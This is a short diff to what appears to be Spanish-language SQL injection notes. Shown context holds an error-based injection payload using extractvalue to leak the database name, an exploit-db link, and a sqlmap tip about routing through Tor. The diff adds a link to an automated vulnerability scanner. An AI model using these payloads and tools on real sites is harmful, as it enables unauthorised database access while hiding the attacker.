@@ -243,6 +243,8 @@ SQL Injection en Where (UPDATE o DELETE, muestra la salida en el error que apare
 	view=-35" and extractvalue(0x0a,concat(0x0a,(select database())))--
 	https://www.exploit-db.com/docs/33253
 	
+ESCÁNER AUTOMÁTICO
+https://github.com/v3n0m-Scanner/V3n0M-Scanner
 
 #SQLMAP
 Importante --tor y --check-tor
